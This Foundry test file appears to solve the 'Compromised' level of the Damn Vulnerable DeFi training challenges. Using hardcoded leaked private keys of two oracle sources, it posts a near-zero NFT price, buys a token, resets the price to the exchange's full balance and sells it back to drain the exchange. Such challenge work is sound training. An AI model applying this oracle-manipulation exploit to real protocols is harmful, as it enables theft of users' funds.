// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/Test.sol";
import {TrustfulOracleInitializer} from "../src/damn-vulnerable-defi/contracts/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../src/damn-vulnerable-defi/contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../src/damn-vulnerable-defi/contracts/compromised/TrustfulOracle.sol";
import {DamnValuableNFT} from "../src/damn-vulnerable-defi/contracts/DamnValuableNFT.sol";

contract MaliciousContract is Test {
    TrustfulOracleInitializer oracleInitializer;
    Exchange exchange;
    TrustfulOracle oracle;
    DamnValuableNFT nft;

    uint256 initialPrice = 999 ether;
    string dvnft = "DVNFT";

    address source1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
    address source2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
    address alice = vm.addr(0xa11CE);

    function setUp() public {
        uint256[] memory prices = new uint256[](2);
        prices[0] = initialPrice;
        prices[1] = initialPrice;

        string[] memory symbols = new string[](2);
        symbols[0] = "DVNFT";
        symbols[1] = "DVNFT";

        address[] memory sources = new address[](2);
        sources[0] = source1;
        sources[1] = source2;

        oracleInitializer = new TrustfulOracleInitializer(
            sources,
            symbols,
            prices
        );

        exchange = new Exchange(0x104fBc016F4bb334D775a19E8A6510109AC63E00);
        oracle = TrustfulOracle(0x104fBc016F4bb334D775a19E8A6510109AC63E00);
        nft = DamnValuableNFT(0xffD4505B3452Dc22f8473616d50503bA9E1710Ac);
        payable(alice).transfer(0.1 ether);
        (bool sent, ) = payable(address(exchange)).call{value: 50 ether}("");
        sent;
    }

    function testSources() public view {
        console.log("Sources: Source 1:: ", source1, "Source 2:: ", source2);
    }

    function testMedianPrices() public view {
        console.log("Median Price: ", oracle.getMedianPrice(dvnft));
        console.log("Exchange Worth: ", address(exchange).balance);
    }

    function testHack() public {
        console.log("Median Price: ", oracle.getMedianPrice(dvnft));

        // Move prices below 0.01 eth to allow purchase.
        vm.prank(source1);
        oracle.postPrice(dvnft, 0.001 ether);

        vm.prank(source2);
        oracle.postPrice(dvnft, 0.001 ether);

        console.log("Median Price: ", oracle.getMedianPrice(dvnft));

        // Purchase NFTs for this contract.
        vm.prank(alice);
        uint256 id = exchange.buyOne{value: 0.02 ether}();

        // Assert Alice has purchased.
        console.log("Alice NFT Balance: ", nft.balanceOf(alice), " ETH Balance: ", alice.balance);

        vm.prank(alice);
        nft.approve(address(exchange), id);

        vm.prank(source1);
        oracle.postPrice(dvnft, address(exchange).balance);

        vm.prank(source2);
        oracle.postPrice(dvnft, address(exchange).balance);

        vm.prank(alice);
        exchange.sellOne(id);

        console.log("Alice NFT Balance: ", nft.balanceOf(alice), " ETH Balance: ", alice.balance);
        console.log("Median Price: ", oracle.getMedianPrice(dvnft));
        console.log("Exchange Worth: ", address(exchange).balance);
    }
}